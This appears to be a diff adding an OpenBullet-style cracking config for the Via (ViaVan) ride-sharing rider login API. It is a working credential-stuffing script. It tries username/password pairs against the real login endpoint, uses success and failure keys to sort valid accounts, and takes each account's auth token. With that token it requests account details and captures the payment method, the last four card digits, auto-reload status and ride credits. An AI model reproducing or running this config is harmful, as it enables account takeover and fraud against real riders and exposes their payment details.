@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "Viavan",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-02T21:35:00.5237116+01:00",
+  "AdditionalInfo": "",
+  "Author": "Shycrackzz",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://viavan-server.live.ridewithvia.com/account/rider/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"city_id\":-1,\"client_details\":{\"client_spec\":{\"client_type\":0,\"client_version\":{\"major_version\":\"3.3.2\",\"minor_version\":\"855\"},\"client_os\":1,\"device_name\":\"unknown\",\"device_model\":\"unknown\",\"client_os_version\":\"5.1.1\",\"device_id\":\"6220351353b875f8\",\"is_kiosk_mode\":false},\"client_state\":{\"client_ts\":1.553206492751E9,\"location_enabled\":true}},\"location\":{\"latlng\":{\"lat\":31.24916,\"lng\":121.4878983,\"googleStyleLatLng\":{\"a\":31.24916,\"b\":121.4878983}},\"timestamp\":1553206492759},\"rider_service_flag\":0}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; SM-G925F Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"message\": \"That password and/or username aren't cutting it. Try again?\"" 
+  KEYCHAIN Success OR 
+    KEY "{\"my_identity\": " 
+PARSE "<SOURCE>" LR "\"id\": " "}," -> VAR "ID" 
+PARSE "<SOURCE>" LR "{\"acct_type\": " "," -> VAR "accType" 
+PARSE "<SOURCE>" LR "\"auth_token\": \"" "\"," -> VAR "authToken" 
+REQUEST POST "https://viavan-server.live.ridewithvia.com/account/rider/get" 
+  CONTENT "{\"whos_asking\":{\"acct_type\":<accType>,\"id\":<ID>,\"auth_token\":\"<authToken>\"},\"city_id\":-1,\"client_details\":{\"client_spec\":{\"client_type\":0,\"client_version\":{\"major_version\":\"3.3.2\",\"minor_version\":\"855\"},\"client_os\":1,\"device_name\":\"unknown\",\"device_model\":\"unknown\",\"client_os_version\":\"5.1.1\",\"device_id\":\"6220351353b875f8\",\"is_kiosk_mode\":false},\"client_state\":{\"client_ts\":1.553207119644E9,\"location_enabled\":true}},\"rider_service_flag\":0}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; SM-G925F Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "\"payment_method_name\": \"" "\"}]," -> CAP "Payment Type" 
+PARSE "<SOURCE>" LR "\"last_four_digits\": \"" "\"," -> CAP "last4Digits" 
+PARSE "<SOURCE>" LR "{\"do_auto_refill\": " "," -> CAP "Auto-Reload" 
+PARSE "<SOURCE>" LR "\"balance_ride_credit\": " "," -> CAP "Ride Credit" 
+PARSE "<SOURCE>" LR "\"free_seats_credit\": " "," -> CAP "Free Seats" 
